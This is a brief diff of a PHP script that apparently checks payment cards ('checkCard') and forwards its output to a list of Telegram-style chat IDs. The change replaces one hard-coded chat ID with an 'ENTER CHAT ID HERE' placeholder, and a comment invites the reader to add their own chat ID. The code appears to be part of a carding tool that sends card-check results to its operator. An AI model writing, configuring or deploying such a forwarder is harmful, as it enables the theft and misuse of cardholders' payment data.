@@ -220,7 +220,7 @@ function checkCard($card)
 
 
 //================= [ FORWARDER ] =================//
-$chatIds = ['2122626569', '-1001812544616', '5001072459'];
+$chatIds = ['2122626569', '5001072459', 'ENTER CHAT ID HERE'];
 //Add your chat id here
 if (!function_exists('send_message')) {
     function send_message($chatIds, $msg) {
